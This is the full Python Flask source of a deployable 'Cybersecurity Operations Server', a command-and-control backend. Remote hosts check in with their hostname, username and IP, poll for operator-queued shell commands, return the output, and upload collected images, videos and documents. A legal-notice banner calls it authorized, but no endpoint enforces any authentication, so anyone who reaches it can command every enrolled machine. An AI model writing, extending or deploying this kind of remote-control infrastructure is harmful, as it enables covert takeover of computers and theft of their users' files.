#!/usr/bin/env python3
"""
CYBERSECURITY OPERATIONS SERVER - Render.com Compatible
Simplified version without flask_limiter
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
import shutil
import hashlib
from datetime import datetime, timedelta
import mimetypes
import logging
from typing import Dict, List

app = Flask(__name__)
CORS(app)

# ============================================================================
# CONFIGURATION
# ============================================================================

# Database configuration
DATABASE = 'cyber_ops.db'

# Storage configuration
UPLOAD_FOLDER = 'evidence_uploads'
EVIDENCE_FOLDER = 'collected_evidence'
DOWNLOAD_FOLDER = 'evidence_downloads'

# Create directories
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(EVIDENCE_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(name)s - %(message)s',
    handlers=[
        logging.FileHandler('cyber_ops_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Server start time
SERVER_START_TIME = time.time()

# ============================================================================
# DATABASE FUNCTIONS
# ============================================================================

def init_db():
    """Initialize database"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Clients table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            os_version TEXT,
            architecture TEXT,
            ip_address TEXT,
            last_seen REAL,
            first_seen REAL,
            status TEXT DEFAULT 'offline',
            operation_id TEXT,
            authorized INTEGER DEFAULT 0,
            client_version TEXT
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            operator_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            output TEXT,
            created_at REAL,
            executed_at REAL,
            requires_auth INTEGER DEFAULT 1
        )
    ''')
    
    # Evidence files table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS evidence (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            filename TEXT,
            filepath TEXT,
            filetype TEXT,
            filesize INTEGER,
            md5_hash TEXT,
            sha256_hash TEXT,
            uploaded_at REAL,
            operator_id TEXT,
            evidence_type TEXT,
            description TEXT
        )
    ''')
    
    # Audit log table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp REAL,
            event_type TEXT,
            operator_id TEXT,
            client_id TEXT,
            ip_address TEXT,
            details TEXT,
            severity TEXT
        )
    ''')
    
    conn.commit()
    conn.close()
    
    logger.info("Database initialized")

def get_db():
    """Get database connection"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def log_audit_event(event_type: str, details: str, operator_id: str = None, 
                    client_id: str = None, severity: str = "INFO"):
    """Log audit event to database"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO audit_log 
            (timestamp, event_type, operator_id, client_id, ip_address, details, severity)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            time.time(),
            event_type,
            operator_id,
            client_id,
            request.remote_addr if request else '0.0.0.0',
            details,
            severity
        ))
        
        conn.commit()
        conn.close()
        
        logger.info(f"[{severity}] {event_type}: {details}")
        
    except Exception as e:
        logger.error(f"Failed to log audit event: {e}")

def calculate_file_hash(filepath: str, hash_type: str = "sha256") -> str:
    """Calculate file hash"""
    try:
        hash_func = hashlib.sha256() if hash_type == "sha256" else hashlib.md5()
        
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                hash_func.update(chunk)
        
        return hash_func.hexdigest()
    except Exception as e:
        logger.error(f"Failed to calculate hash: {e}")
        return ""

# ============================================================================
# CLIENT ENDPOINTS
# ============================================================================

@app.route('/api/client/checkin', methods=['POST'])
def client_checkin():
    """Client checkin endpoint"""
    try:
        data = request.json
        client_id = data.get('id')
        
        if not client_id:
            return jsonify({'error': 'Missing client ID'}), 400
        
        operation_id = data.get('operation_id')
        if not operation_id:
            return jsonify({'error': 'Missing operation ID'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        hostname = data.get('hostname', 'unknown')
        
        # Check if client exists
        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        existing = cursor.fetchone()
        
        if existing:
            # Update existing client
            cursor.execute('''
                UPDATE clients 
                SET last_seen = ?, status = 'online',
                    hostname = COALESCE(?, hostname),
                    username = COALESCE(?, username),
                    os = COALESCE(?, os),
                    os_version = COALESCE(?, os_version),
                    operation_id = ?
                WHERE id = ?
            ''', (current_time, 
                  hostname,
                  data.get('username'),
                  data.get('os'),
                  data.get('os_version'),
                  operation_id,
                  client_id))
        else:
            # Insert new client
            cursor.execute('''
                INSERT INTO clients 
                (id, hostname, username, os, os_version, architecture, 
                 ip_address, last_seen, first_seen, status, operation_id, 
                 authorized, client_version)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'online', ?, 0, ?)
            ''', (client_id,
                  hostname,
                  data.get('username', 'unknown'),
                  data.get('os', 'unknown'),
                  data.get('os_version', 'unknown'),
                  data.get('architecture', 'unknown'),
                  request.remote_addr,
                  current_time,
                  current_time,
                  operation_id,
                  data.get('client_version', '1.0')))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Client checkin: {client_id[:8]}... ({hostname})")
        log_audit_event("CLIENT_CHECKIN", f"Checkin from {hostname}", 
                       None, client_id)
        
        return jsonify({
            'status': 'ok',
            'timestamp': current_time,
            'message': 'Checkin successful'
        }), 200
        
    except Exception as e:
        logger.error(f"Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# COMMAND ENDPOINTS
# ============================================================================

@app.route('/api/command/send', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        operator_id = data.get('operator_id', 'unknown')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        # Check if client exists
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT status FROM clients WHERE id = ?', (client_id,))
        client = cursor.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        # Create command record
        cmd_id = str(uuid.uuid4())
        current_time = time.time()
        
        cursor.execute('''
            INSERT INTO commands 
            (id, client_id, operator_id, command, status, created_at, requires_auth)
            VALUES (?, ?, ?, ?, 'pending', ?, 1)
        ''', (cmd_id, client_id, operator_id, command, current_time))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Command sent: {cmd_id[:8]} -> {client_id[:8]}: {command[:50]}")
        log_audit_event("COMMAND_SEND", f"Command: {command[:100]}", 
                       operator_id, client_id)
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued'
        }), 200
        
    except Exception as e:
        logger.error(f"Command send error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/list/<client_id>', methods=['GET'])
def list_commands(client_id):
    """Get pending commands for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Update client last seen
        cursor.execute('UPDATE clients SET last_seen = ? WHERE id = ?', 
                      (time.time(), client_id))
        
        # Get pending commands
        cursor.execute('''
            SELECT id, command, operator_id, created_at 
            FROM commands 
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 20
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command'],
                'operator_id': row['operator_id'],
                'created_at': row['created_at'],
                'age': time.time() - row['created_at']
            })
        
        # Mark as sent
        if commands:
            cmd_ids = [cmd['id'] for cmd in commands]
            placeholders = ','.join(['?' for _ in cmd_ids])
            cursor.execute(f'''
                UPDATE commands SET status = 'sent'
                WHERE id IN ({placeholders})
            ''', cmd_ids)
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        logger.error(f"List commands error: {e}")
        return jsonify({'commands': []}), 500

@app.route('/api/command/submit', methods=['POST'])
def submit_result():
    """Submit command execution result"""
    try:
        data = request.json
        cmd_id = data.get('command_id')
        output = data.get('output', '')
        status = data.get('status', 'completed')
        
        if not cmd_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        # Limit output size
        output = output[:5000]
        
        conn = get_db()
        cursor = conn.cursor()
        
        # Get command details
        cursor.execute('SELECT client_id, command FROM commands WHERE id = ?', (cmd_id,))
        cmd_data = cursor.fetchone()
        
        if not cmd_data:
            conn.close()
            return jsonify({'error': 'Command not found'}), 404
        
        client_id = cmd_data['client_id']
        command = cmd_data['command']
        
        # Update command record
        cursor.execute('''
            UPDATE commands 
            SET status = ?, output = ?, executed_at = ?
            WHERE id = ?
        ''', (status, output, time.time(), cmd_id))
        
        # Log execution
        log_audit_event("COMMAND_EXEC", 
                       f"Command executed: {command[:50]} | Status: {status}",
                       None, client_id)
        
        conn.commit()
        conn.close()
        
        logger.info(f"Command result: {cmd_id[:8]} -> {status}")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        logger.error(f"Submit result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result/<cmd_id>', methods=['GET'])
def get_command_result(cmd_id):
    """Get command execution result"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT c.*, cl.hostname 
            FROM commands c
            LEFT JOIN clients cl ON c.client_id = cl.id
            WHERE c.id = ?
        ''', (cmd_id,))
        
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'command_id': row['id'],
                'client_id': row['client_id'],
                'hostname': row['hostname'],
                'operator_id': row['operator_id'],
                'command': row['command'],
                'status': row['status'],
                'output': row['output'] or '',
                'created_at': row['created_at'],
                'executed_at': row['executed_at']
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Command not found'
            }), 404
            
    except Exception as e:
        logger.error(f"Get result error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# EVIDENCE ENDPOINTS
# ============================================================================

@app.route('/api/evidence/upload', methods=['POST'])
def upload_evidence():
    """Upload evidence file"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        operator_id = request.form.get('operator_id', 'unknown')
        evidence_type = request.form.get('evidence_type', 'unknown')
        description = request.form.get('description', '')
        
        if not client_id:
            return jsonify({'error': 'Missing client_id'}), 400
        
        # Validate client exists
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT hostname FROM clients WHERE id = ?', (client_id,))
        client = cursor.fetchone()
        
        if not client:
            conn.close()
            return jsonify({'error': 'Client not found'}), 404
        
        hostname = client['hostname']
        conn.close()
        
        # Determine file type
        filename = file.filename.lower()
        if any(filename.endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
            filetype = 'image'
            subfolder = 'images'
        elif any(filename.endswith(ext) for ext in ['.mp4', '.avi', '.mov', '.mkv', '.webm']):
            filetype = 'video'
            subfolder = 'videos'
        elif any(filename.endswith(ext) for ext in ['.txt', '.log', '.csv', '.json']):
            filetype = 'log'
            subfolder = 'logs'
        elif any(filename.endswith(ext) for ext in ['.pdf', '.doc', '.docx', '.xls', '.xlsx']):
            filetype = 'document'
            subfolder = 'documents'
        else:
            filetype = 'other'
            subfolder = 'misc'
        
        # Create organized folder structure
        client_folder = os.path.join(EVIDENCE_FOLDER, client_id[:8])
        type_folder = os.path.join(client_folder, subfolder)
        os.makedirs(type_folder, exist_ok=True)
        
        # Generate safe filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_filename = f"{timestamp}_{file.filename.replace(' ', '_')}"
        filepath = os.path.join(type_folder, safe_filename)
        
        # Save file
        file.save(filepath)
        filesize = os.path.getsize(filepath)
        
        # Calculate file hashes
        md5_hash = calculate_file_hash(filepath, 'md5')
        sha256_hash = calculate_file_hash(filepath, 'sha256')
        
        # Save to database
        evidence_id = str(uuid.uuid4())
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO evidence 
            (id, client_id, filename, filepath, filetype, filesize, 
             md5_hash, sha256_hash, uploaded_at, operator_id, 
             evidence_type, description)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (evidence_id, client_id, file.filename, filepath, filetype, 
              filesize, md5_hash, sha256_hash, time.time(), operator_id,
              evidence_type, description))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Evidence uploaded: {evidence_id} | {file.filename} ({filesize} bytes)")
        log_audit_event("EVIDENCE_UPLOAD", 
                       f"File: {file.filename} | Type: {evidence_type}",
                       operator_id, client_id)
        
        return jsonify({
            'success': True,
            'evidence_id': evidence_id,
            'filename': file.filename,
            'filetype': filetype,
            'size': filesize,
            'md5_hash': md5_hash,
            'sha256_hash': sha256_hash,
            'uploaded_at': time.time()
        }), 200
        
    except Exception as e:
        logger.error(f"Evidence upload error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# MANAGEMENT ENDPOINTS
# ============================================================================

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get all clients"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Update status based on last_seen
        cursor.execute('''
            UPDATE clients 
            SET status = CASE 
                WHEN ? - last_seen > 180 THEN 'offline'
                WHEN ? - last_seen > 60 THEN 'idle'
                ELSE 'online'
            END
        ''', (current_time, current_time))
        
        conn.commit()
        
        # Get all clients with statistics
        cursor.execute('''
            SELECT c.*, 
                   COUNT(DISTINCT e.id) as evidence_count,
                   COUNT(DISTINCT cmd.id) as command_count
            FROM clients c
            LEFT JOIN evidence e ON c.id = e.client_id
            LEFT JOIN commands cmd ON c.id = cmd.client_id
            GROUP BY c.id
            ORDER BY c.last_seen DESC
        ''')
        
        clients = []
        for row in cursor.fetchall():
            time_diff = current_time - row['last_seen']
            
            # Determine status with emoji
            if time_diff < 60:
                status_emoji = '🟢'
                status_text = 'online'
            elif time_diff < 300:
                status_emoji = '🟡'
                status_text = 'idle'
            else:
                status_emoji = '🔴'
                status_text = 'offline'
            
            # Format last seen
            if row['last_seen']:
                last_seen_dt = datetime.fromtimestamp(row['last_seen'])
                last_seen_str = last_seen_dt.strftime('%H:%M:%S')
                if datetime.now().date() != last_seen_dt.date():
                    last_seen_str = last_seen_dt.strftime('%Y-%m-%d %H:%M')
            else:
                last_seen_str = 'never'
            
            clients.append({
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': row['os'],
                'os_version': row['os_version'],
                'status': row['status'],
                'status_display': f"{status_emoji} {status_text}",
                'evidence_count': row['evidence_count'] or 0,
                'command_count': row['command_count'] or 0,
                'last_seen': row['last_seen'],
                'last_seen_str': last_seen_str,
                'first_seen': row['first_seen'],
                'first_seen_str': datetime.fromtimestamp(row['first_seen']).strftime('%Y-%m-%d') if row['first_seen'] else 'unknown',
                'operation_id': row['operation_id'],
                'authorized': bool(row['authorized'])
            })
        
        conn.close()
        
        return jsonify({'clients': clients}), 200
        
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        return jsonify({'clients': []}), 500

@app.route('/api/evidence/list/<client_id>', methods=['GET'])
def list_evidence(client_id):
    """List evidence for a client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, filename, filetype, filesize, md5_hash, 
                   uploaded_at, operator_id, evidence_type, description
            FROM evidence 
            WHERE client_id = ?
            ORDER BY uploaded_at DESC
            LIMIT 100
        ''', (client_id,))
        
        evidence_list = []
        for row in cursor.fetchall():
            evidence_list.append({
                'id': row['id'],
                'filename': row['filename'],
                'filetype': row['filetype'],
                'size': row['filesize'],
                'size_str': f"{row['filesize'] / 1024 / 1024:.2f} MB" if row['filesize'] > 1024*1024 else f"{row['filesize'] / 1024:.1f} KB",
                'md5_hash': row['md5_hash'][:16] if row['md5_hash'] else '',
                'uploaded_at': row['uploaded_at'],
                'time_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%H:%M:%S'),
                'date_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d'),
                'operator_id': row['operator_id'],
                'evidence_type': row['evidence_type'],
                'description': row['description']
            })
        
        conn.close()
        return jsonify({'evidence': evidence_list}), 200
        
    except Exception as e:
        logger.error(f"List evidence error: {e}")
        return jsonify({'evidence': []}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Counts
        cursor.execute('SELECT COUNT(*) FROM clients')
        total_clients = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
        online_now = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM commands')
        total_commands = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM evidence')
        total_evidence = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM evidence WHERE filetype = "image"')
        image_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM evidence WHERE filetype = "log"')
        log_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT SUM(filesize) FROM evidence')
        total_size = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(DISTINCT operator_id) FROM commands')
        unique_operators = cursor.fetchone()[0]
        
        conn.close()
        
        # Server uptime
        uptime = current_time - SERVER_START_TIME
        uptime_str = str(timedelta(seconds=int(uptime)))
        
        return jsonify({
            'server': {
                'version': '2.0',
                'uptime': uptime,
                'uptime_str': uptime_str,
                'start_time': SERVER_START_TIME,
                'current_time': current_time
            },
            'clients': {
                'total': total_clients,
                'online_now': online_now,
                'offline': total_clients - online_now
            },
            'operations': {
                'total_commands': total_commands,
                'total_evidence': total_evidence,
                'unique_operators': unique_operators
            },
            'evidence': {
                'total_files': total_evidence,
                'images': image_files,
                'logs': log_files,
                'total_size': total_size,
                'total_size_str': f"{total_size / 1024 / 1024 / 1024:.2f} GB"
            },
            'storage': {
                'evidence_folder': EVIDENCE_FOLDER,
                'upload_folder': UPLOAD_FOLDER
            }
        }), 200
        
    except Exception as e:
        logger.error(f"Get stats error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    try:
        # Basic system checks
        disk_usage = shutil.disk_usage('.')
        
        # Database connectivity check
        db_status = 'ok'
        try:
            conn = get_db()
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM clients')
            conn.close()
        except Exception as e:
            db_status = f'error: {e}'
        
        return jsonify({
            'status': 'healthy',
            'timestamp': time.time(),
            'version': '2.0',
            'server_time': datetime.now().isoformat(),
            'system': {
                'disk_total': disk_usage.total,
                'disk_free': disk_usage.free,
                'disk_used': disk_usage.used,
                'disk_percent': (disk_usage.used / disk_usage.total) * 100
            },
            'database': {
                'status': db_status
            }
        }), 200
        
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return jsonify({'status': 'degraded', 'error': str(e)}), 500

# ============================================================================
# WEB INTERFACE
# ============================================================================

@app.route('/')
def index():
    """Web interface"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cybersecurity Operations Server</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
                background: linear-gradient(135deg, #1a2980 0%, #26d0ce 100%);
                min-height: 100vh;
                color: white;
            }
            .container {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 30px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            h1 {
                text-align: center;
                margin-bottom: 30px;
                font-size: 2.5em;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            }
            .dashboard {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }
            .card {
                background: rgba(255, 255, 255, 0.15);
                border-radius: 15px;
                padding: 20px;
                text-align: center;
                transition: transform 0.3s;
            }
            .card:hover {
                transform: translateY(-5px);
                background: rgba(255, 255, 255, 0.2);
            }
            .card h3 {
                margin-top: 0;
                font-size: 1.2em;
            }
            .card .number {
                font-size: 2em;
                font-weight: bold;
                margin: 10px 0;
            }
            .endpoint-list {
                background: rgba(0, 0, 0, 0.2);
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                font-family: monospace;
            }
            .endpoint {
                padding: 5px 0;
                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            }
            .btn {
                display: inline-block;
                background: white;
                color: #1a2980;
                padding: 12px 24px;
                border-radius: 50px;
                text-decoration: none;
                font-weight: bold;
                margin: 10px 5px;
                transition: all 0.3s;
            }
            .btn:hover {
                background: #f8f9fa;
                transform: scale(1.05);
            }
            .legal-notice {
                background: rgba(255, 0, 0, 0.1);
                border: 1px solid rgba(255, 0, 0, 0.3);
                padding: 15px;
                border-radius: 10px;
                margin: 20px 0;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔒 Cybersecurity Operations Server</h1>
            
            <div class="legal-notice">
                <strong>⚠ LEGAL NOTICE:</strong> This server is for AUTHORIZED security operations only.
            </div>
            
            <div id="stats" class="dashboard">
                <!-- Stats will be loaded dynamically -->
            </div>
            
            <div style="text-align: center; margin: 40px 0;">
                <a href="/api/clients" class="btn" target="_blank">View Clients</a>
                <a href="/api/stats" class="btn" target="_blank">Server Stats</a>
                <a href="/api/health" class="btn" target="_blank">Health Check</a>
            </div>
            
            <h3>Available API Endpoints:</h3>
            <div class="endpoint-list">
                <div class="endpoint"><strong>GET</strong> /api/clients - List all clients</div>
                <div class="endpoint"><strong>GET</strong> /api/stats - Server statistics</div>
                <div class="endpoint"><strong>GET</strong> /api/health - Health check</div>
                <div class="endpoint"><strong>POST</strong> /api/command/send - Send command</div>
                <div class="endpoint"><strong>POST</strong> /api/evidence/upload - Upload evidence</div>
                <div class="endpoint"><strong>GET</strong> /api/evidence/list/&lt;id&gt; - List evidence</div>
            </div>
            
            <div style="margin-top: 40px; text-align: center; opacity: 0.8;">
                <p>Server started: <span id="start-time">Loading...</span></p>
                <p>Use the CyberOps Console for full control</p>
            </div>
        </div>
        
        <script>
            async function loadStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    
                    const statsDiv = document.getElementById('stats');
                    const startTime = new Date(data.server.start_time * 1000);
                    
                    statsDiv.innerHTML = `
                        <div class="card">
                            <h3>📱 Active Clients</h3>
                            <div class="number">${data.clients.online_now}</div>
                            <p>of ${data.clients.total} total</p>
                        </div>
                        <div class="card">
                            <h3>📁 Evidence Files</h3>
                            <div class="number">${data.evidence.total_files}</div>
                            <p>${data.evidence.total_size_str}</p>
                        </div>
                        <div class="card">
                            <h3>⚡ Server Uptime</h3>
                            <div class="number">${data.server.uptime_str.split(':')[0]}h</div>
                            <p>Since ${startTime.toLocaleTimeString()}</p>
                        </div>
                        <div class="card">
                            <h3>🔧 Operations</h3>
                            <div class="number">${data.operations.total_commands}</div>
                            <p>${data.operations.unique_operators} operators</p>
                        </div>
                    `;
                    
                    document.getElementById('start-time').textContent = startTime.toLocaleString();
                    
                } catch (error) {
                    document.getElementById('stats').innerHTML = 
                        '<p style="text-align:center;color:#ff6b6b;">Error loading statistics</p>';
                }
            }
            
            loadStats();
            setInterval(loadStats, 30000);
        </script>
    </body>
    </html>
    '''

# ============================================================================
# MAINTENANCE
# ============================================================================

def update_client_status():
    """Periodically update client status"""
    while True:
        time.sleep(60)
        try:
            conn = get_db()
            cursor = conn.cursor()
            
            current_time = time.time()
            
            # Mark clients as offline if not seen in 5 minutes
            cursor.execute('''
                UPDATE clients 
                SET status = CASE 
                    WHEN ? - last_seen > 300 THEN 'offline'
                    WHEN ? - last_seen > 180 THEN 'idle'
                    ELSE status
                END
                WHERE status IN ('online', 'idle')
            ''', (current_time, current_time))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Status update error: {e}")

# ============================================================================
# MAIN FUNCTION
# ============================================================================

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Start maintenance thread
    threading.Thread(target=update_client_status, daemon=True).start()
    
    # Display startup banner
    print(f"""
╔══════════════════════════════════════════════════════════╗
║      CYBERSECURITY OPERATIONS SERVER                    ║
║         Render.com Compatible Version                   ║
╚══════════════════════════════════════════════════════════╝

    📊 Database: {DATABASE}
    📁 Evidence: {EVIDENCE_FOLDER}/
    📂 Uploads: {UPLOAD_FOLDER}/
    
    🎯 Features:
    • 🔐 Client management
    • 📝 Command execution
    • 🗂️ Evidence collection
    • 📊 Real-time statistics
    
    ⚠  LEGAL NOTICE:
    This server is for AUTHORIZED security operations only.
    
    🔗 Server: http://0.0.0.0:5000
    📝 Logging to: cyber_ops_server.log
    
    Starting server...
    """)
    
    # Run server
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
